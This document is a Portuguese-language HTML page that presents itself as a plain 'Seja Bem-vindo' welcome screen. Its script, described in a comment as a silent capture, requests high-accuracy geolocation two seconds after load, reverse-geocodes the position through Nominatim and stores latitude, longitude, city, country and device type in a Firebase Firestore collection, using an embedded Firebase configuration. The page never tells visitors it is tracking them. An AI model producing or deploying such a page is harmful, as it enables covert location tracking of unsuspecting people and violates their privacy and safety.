<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bem-vindo</title>
    <style>
        body { 
            margin: 0;
            padding: 0;
            background-color: #000000; /* Tela totalmente preta */
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #ffffff;
            font-family: 'Segoe UI', sans-serif;
            overflow: hidden;
        }
        .welcome-text {
            font-size: 2rem;
            font-weight: 300;
            letter-spacing: 2px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { opacity: 0.5; }
            50% { opacity: 1; }
            100% { opacity: 0.5; }
        }
    </style>
</head>
<body>

    <div class="welcome-text">Seja Bem-vindo</div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAqgPPmWG6cM3xpFLtOBjQJ8PmAVV7YgaY",
            authDomain: "chatt-4bfcd.firebaseapp.com",
            projectId: "chatt-4bfcd",
            storageBucket: "chatt-4bfcd.firebasestorage.app",
            messagingSenderId: "1056039006721",
            appId: "1:1056039006721:web:7df8605c6dc1b77b460600"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        window.onload = () => {
            // Aguarda 2 segundos e executa a captura silenciosa
            setTimeout(async () => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        const { latitude, longitude } = pos.coords;
                        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                        
                        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
                        const data = await res.json();
                        
                        await addDoc(collection(db, "acessos"), {
                            dispositivo: isMobile ? "Mobile" : "Desktop",
                            cidade: data.address.city || data.address.town || "Desconhecido",
                            pais: data.address.country || "Desconhecido",
                            latitude: latitude,
                            longitude: longitude,
                            horario: new Date().toLocaleTimeString('pt-BR'),
                            timestamp: serverTimestamp()
                        });
                    }, null, { enableHighAccuracy: true });
                }
            }, 2000);
        };
    </script>
</body>
</html>
